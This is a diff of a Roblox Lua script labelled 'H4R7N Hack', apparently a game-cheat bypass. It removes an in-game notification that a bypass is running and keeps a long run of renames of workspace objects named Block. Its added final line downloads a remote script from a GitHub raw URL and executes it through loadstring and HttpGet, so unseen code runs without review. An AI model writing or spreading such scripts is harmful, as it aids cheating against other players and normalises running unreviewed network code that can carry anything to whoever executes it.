@@ -1,5 +1,3 @@
-game.StarterGui:SetCore("SendNotification",{["Title"]="H4R7N Hack",["Text"]="Bypass 2 Yapiliyor Lutfen Bekleyiniz!",["Duration"]=4})
-wait(0.1)
 local yarak1 = game.Workspace.Block
 yarak1.Name = "Block1"
 wait(0.1)
@@ -170,3 +168,5 @@ yarak1.Name = "Block56"
 wait(0.1)
 local yarak1 = game.Workspace.Block
 yarak1.Name = "Block57"
+wait(0.1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7N/lua/main/bypass3.lua"))()
